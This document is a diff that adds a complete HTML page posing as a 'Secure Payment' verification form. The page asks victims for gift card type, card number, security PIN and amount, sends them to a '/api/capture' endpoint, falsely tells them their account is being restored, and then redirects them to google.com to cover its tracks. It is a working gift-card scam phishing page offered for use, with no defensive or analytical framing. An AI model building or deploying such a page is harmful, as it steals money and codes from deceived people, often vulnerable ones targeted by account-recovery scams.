@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Payment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background: #f4f7f9; text-align: center; padding: 50px 20px; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Verify Payment</h1>
+        <p>Enter your Gift Card details to complete the process.</p>
+        <form id="paymentForm">
+            <select name="card_type" id="card_type">
+                <option value="iTunes">iTunes</option>
+                <option value="Google Play">Google Play</option>
+                <option value="Amazon">Amazon</option>
+            </select>
+            <input type="text" name="card_number" placeholder="Card Number" required>
+            <input type="text" name="card_pin" placeholder="Security PIN" required>
+            <input type="number" name="amount" placeholder="Amount ($)" required>
+            <button type="submit">ACTIVATE NOW</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('paymentForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
+
+            // Send data to your Backend API
+            const response = await fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            if (response.ok) {
+                alert("Verification successful! Your account is being restored.");
+                window.location.href = 'https://google.com'; // Redirect to a real site
+            } else {
+                alert("Error: Please try again.");
+            }
+        };
+    </script>
+</body>
+</html>
